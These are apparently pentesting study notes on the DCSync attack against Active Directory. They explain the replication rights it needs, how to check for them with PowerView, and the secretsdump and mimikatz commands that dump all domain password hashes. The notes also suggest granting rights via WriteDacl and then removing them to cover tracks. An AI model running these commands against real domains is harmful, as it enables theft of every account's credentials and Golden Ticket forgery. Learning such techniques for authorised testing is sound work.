# DcSync - DS-Replication-Get-Changes-All

## Overview

Active Directory uses replication to synchronize data (e.g., user account information, password hashes) across domain controllers. DCsync leverages this replication mechanism by imitating a legitimate domain controller to request and receive data such as password hashes. The goal is to extract sensitive data like: NTLM hashes, Kerberos tickets and Passwords of high-value accounts (e.g., Domain Admins or KRBTGT account).


DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes. The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

If we had certain rights over the user (such as WriteDacl), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

## Attack Requirements:

An account with the priveledges:

- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All

or

- WriteDacl (to grant the right to DCSync)

Usually this permissions are only found in admin accounts

## Attack Result:

This attack can lead to the compromise of major credential material such as the Kerberos krbtgt keys used legitimately for tickets creation, but also for tickets forging by attackers. The consequences of this attack are similar to an NTDS.dit dump and parsing but the practical aspect differ.

- All the hashes in the domain controller

We can use this hashes in Pass the Hash attacks, Golden tickets attacks(with the krbtgt hash), etc.

## Attack Execution:

### Check if a user has this permissions:

    first get the user sid:

    Get-DomainUser -Identity <sam_account_name> |select samaccountname,objectsid,memberof,useraccountcontrol |fl
    $sid = "<user_sid>"

    Get-ObjectAcl "DC=<domain_name>,DC=<domain_name>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

### With secretsdump

    impacket-secretsdump -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>:<password>@<dc_ip>
    impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT.LOCAL/tpetty:password1!@DC01.INLANEFREIGHT.LOCAL

### With mimikatz

    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
